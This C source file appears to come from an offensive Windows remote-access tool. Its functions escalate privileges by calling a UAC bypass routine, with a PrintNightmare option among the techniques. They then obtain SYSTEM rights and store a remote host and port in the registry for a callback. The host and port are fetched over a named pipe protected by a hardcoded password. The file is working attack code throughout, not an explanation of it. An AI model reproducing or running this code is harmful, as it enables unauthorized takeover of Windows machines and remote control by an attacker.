#include <windows.h>
#include <stdio.h>

#include "MgArguments.h"
#include "Tools.h"
#include "Message.h"

#include "CheckSystem.h"
#include "BypassUac.h"
#include "GetSystem.h"
#include "PipeServer.h"

#include "LoadAPI.h"

BOOL PrivEscExploit(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, Arguments listAgrument, char* portStr){
    char* CurrentProcessPath = (char*)calloc(MAX_PATH, 1);
    if (CurrentProcessPath != NULL){
        if (kernel32.GetModuleFileNameAF(0, CurrentProcessPath, MAX_PATH) != 0){
            if (RunUacBypass(kernel32, advapi32, shell32,CurrentProcessPath, listAgrument.host, portStr, listAgrument.UacBypassTec, listAgrument.wincatDefaultDir)){
                printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC Bypass worked !\n");
                free(CurrentProcessPath);
                return TRUE;
            }else
                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "UAC Bypass failed");
        }
        free(CurrentProcessPath);
    }
    return FALSE;
}



BOOL PrivEsc(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, Arguments listAgrument){
    char portStr[12];
    _itoa_s(listAgrument.port, portStr, sizeof(portStr), 10);

    if (listAgrument.UacBypassTec == UAC_BYPASS_PRINT_NIGHTMARE){
        return PrivEscExploit(kernel32, advapi32, shell32,listAgrument, portStr);
    } else{
        if (IsRunAsAdmin(advapi32)){
            printMsg(STATUS_INFO, LEVEL_DEFAULT, "Process running with admin priv !\n");
            if (!isArgHostSet(advapi32) && !SaveRHostInfo(advapi32, listAgrument.host, portStr)){
                printMsg(STATUS_INFO, LEVEL_DEFAULT, "Error to add the reg key for host/port!\n");
                return FALSE;
            } else
                GetSystem(kernel32, advapi32);
        } else{
            printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process not running with admin priv\n");
            if (IsUserInAdminGroup()){
                printMsg(STATUS_INFO, LEVEL_DEFAULT, "User is in the admin group\n");
                PrivEscExploit(kernel32, advapi32, shell32, listAgrument, portStr);
            } else
                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "User is no in the admin group");
        }
    }
    return TRUE;
}


BOOL GetInfoPipeSystem(Arguments* listAgrument){
    PipeDataStruct pipeDataStruct;
    const char* lpszPipename = "\\\\.\\pipe\\mynamedpipeHigh";
    const char* password = "SeMf523hqsXxaAy8bUaCRPbW62UT7R4ybXqJZjNVDnKya9ggXJ6UjKku77mB";

    if (SendInfoPipe(&pipeDataStruct, lpszPipename, password)){
        printMsg(STATUS_TITLE, LEVEL_DEFAULT, "Result:\n");
        printMsg(STATUS_OK2, LEVEL_DEFAULT, "Ip address: %s\n", pipeDataStruct.ipAddress);
        printMsg(STATUS_OK2, LEVEL_DEFAULT, "Port: %i\n", pipeDataStruct.port);

        swprintf_s(listAgrument->host, 1024, L"%hs", pipeDataStruct.ipAddress);
        listAgrument->port = pipeDataStruct.port;
        return TRUE;
    }
    return FALSE;
}
